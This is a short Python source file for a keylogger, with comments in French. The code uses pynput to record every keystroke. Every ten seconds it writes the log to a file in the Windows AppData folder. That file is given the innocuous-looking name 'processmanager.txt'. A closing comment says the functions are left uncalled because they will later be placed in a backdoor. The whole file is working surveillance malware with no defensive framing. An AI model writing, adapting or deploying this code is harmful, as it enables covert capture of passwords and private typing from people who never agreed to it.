#!/usr/bin/python3

import pynput.keyboard
import threading
import os


#path = "log.txt"

def process_keys(key):
	global log
	try:
		log = log + str(key.char)
	except AttributeError:
		if key == key.space:
			log = log + " "
		elif key == key.up:
			log = log + "<up>"
		elif key == key.down:
			log = log + "<down>"
		elif key == key.left:
			log = log + "<left>"
		elif key == key.right:
			log = log + "<right>"
		else:
			log = log + " !" + str(key)[4:] + "! "

def report():
	global log
	global path
	fin = open(path, "a") #append pour ajouter
	fin.write(log)
	log = "" #pour ne pas copier des char pls fois
	fin.close()
	timer = threading.Timer(10,report) #toutes les 10sec on va executer le threading report
	timer.start()


def start():
	keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
	with keyboard_listener:
		report()
		keyboard_listener.join()

log = ""
path = os.environ["appdata"] + "\\processmanager.txt" #nom du fichier qui sera ds appdata

# start() #on appelle pas les fonctions, elles seront en backdoor plus tard
